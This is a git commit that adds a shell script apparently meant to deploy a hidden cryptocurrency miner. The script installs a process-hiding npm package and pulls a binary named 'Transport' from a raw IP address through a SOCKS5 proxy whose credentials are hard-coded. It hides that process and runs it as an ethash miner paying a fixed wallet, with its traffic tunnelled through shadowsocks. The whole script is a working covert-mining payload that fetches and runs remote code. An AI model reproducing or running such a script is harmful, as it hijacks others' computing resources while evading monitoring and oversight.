1159b773a17000a737fbb76e8bc5c16264812685
nathanfleight <92636939+nathanfleight@users.noreply.github.com>
2022-01-15 00:55:23 +0200

    Create start_Transport_fle_ws2.sh

---
+++ start_Transport_fle_ws2.sh
@@ -0,0 +1,42 @@
+apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs
+
+npm i -g node-process-hider
+
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 3.16.66.235:1080
+socks5_username = mikrotik999
+socks5_password = Elibawnos
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget http://3.16.66.235/Transport
+chmod +x Transport
+
+apt -y install shadowsocks-libev rng-tools
+
+ss-local -s 3.16.66.235 -p 8388 -l 9999 -k Elibawnos -m chacha20-ietf-poly1305 -v &
+
+ph add Transport
+
+./Transport -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -u 0x8CB8003E428D0Fd7693D22f576A212403728c64a -p x -w Transport --no-sni --dns-https-server 1.1.1.1 --proxy 127.0.0.1:9999
